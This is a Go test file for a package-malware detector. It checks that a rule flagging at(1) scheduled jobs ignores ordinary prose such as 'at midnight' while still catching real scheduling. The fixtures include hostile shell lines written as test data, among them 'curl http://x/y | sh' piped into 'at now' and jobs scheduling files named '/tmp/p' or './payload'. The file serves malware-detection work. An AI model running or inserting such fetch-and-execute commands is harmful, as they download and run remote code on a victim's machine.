package detect

import "testing"

// P-AT-JOB scored 60 points for the English preposition. Its pattern was
// `\bat\s+(now|midnight|noon|teatime|\d{1,2}:\d{2})`, which has no notion of command
// position, so "Stop at midnight" and "Created ... at 18:49" scheduled nothing and
// still counted as deferred execution.
//
// Measured on production 2026-08-08: the rule appeared in 1,279 malware mints across
// nine ecosystems and was the SOLE evidence for hundreds of them — pypi 408 mints /
// 115 sole, packagist 386/145, go 249/62, cargo 102/19, npm 69/19. The two
// sole-evidence samples below are copied verbatim out of CVEMetadata.rawDataJSON.
//
// The guard is command position, expressed with \n in the separator class rather than
// `^`, because patterns run against whole file content (detect/patterns.go:123) where
// `^` can only ever mean start-of-file.

// Verbatim production false positives, plus the prose forms they generalise to.
const proseAtMentions = `<?php
/**
 * Created by PhpStorm on 01/05/2022 at 18:49
 */
// The cache is evaluated at midnight and again at noon.
# Stop at midnight wraps cleanly to 0 (the modulo)
$msg = "the standup is at 09:30, be there";
// deploys land at teatime, per the release notes
`

// Genuine at(1) scheduling in every shell position the guard admits.
var realAtJobs = map[string]string{
	"line start":        "at now <<EOF\ncurl http://x/y | sh\nEOF",
	"indented":          "if true; then\n    at midnight -f /tmp/p\nfi",
	"piped":             `echo "curl http://x/y | sh" | at now`,
	"after semicolon":   "cd /tmp; at 03:00 -f ./payload",
	"after and":         "make build && at noon -f ./cron",
	"subshell":          "(at teatime -f /tmp/p)",
	"brace group":       "{ at 23:59 -f /tmp/p; }",
	"command substitut": "out=`at now -f /tmp/p`",
}

func TestAtJobIgnoresProse(t *testing.T) {
	f := Detect(&PackageContext{Name: "vendor/pkg", PkgbuildContent: proseAtMentions})
	if has(f, "P-AT-JOB") {
		t.Errorf("P-AT-JOB fired on prose/comment mentions of \"at\"; findings=%v", ids(f))
	}
}

func TestAtJobStillCatchesRealScheduling(t *testing.T) {
	for name, src := range realAtJobs {
		t.Run(name, func(t *testing.T) {
			f := Detect(&PackageContext{Name: "vendor/pkg", PkgbuildContent: src})
			if !has(f, "P-AT-JOB") {
				t.Errorf("P-AT-JOB did not fire on %q — the guard is too narrow", src)
			}
		})
	}
}

// Each time keyword on its own, so narrowing the alternation later cannot silently
// drop one while the prose test still passes.
func TestAtJobPerTimeKeyword(t *testing.T) {
	for _, when := range []string{"now", "midnight", "noon", "teatime", "3:00", "23:59"} {
		t.Run("fires/"+when, func(t *testing.T) {
			f := Detect(&PackageContext{Name: "vendor/pkg", PkgbuildContent: "at " + when + " -f /tmp/p"})
			if !has(f, "P-AT-JOB") {
				t.Errorf("P-AT-JOB did not fire on %q", "at "+when)
			}
		})
		t.Run("quiet/"+when, func(t *testing.T) {
			src := "// the job runs at " + when + " every day"
			f := Detect(&PackageContext{Name: "vendor/pkg", PkgbuildContent: src})
			if has(f, "P-AT-JOB") {
				t.Errorf("P-AT-JOB fired on prose %q", src)
			}
		})
	}
}
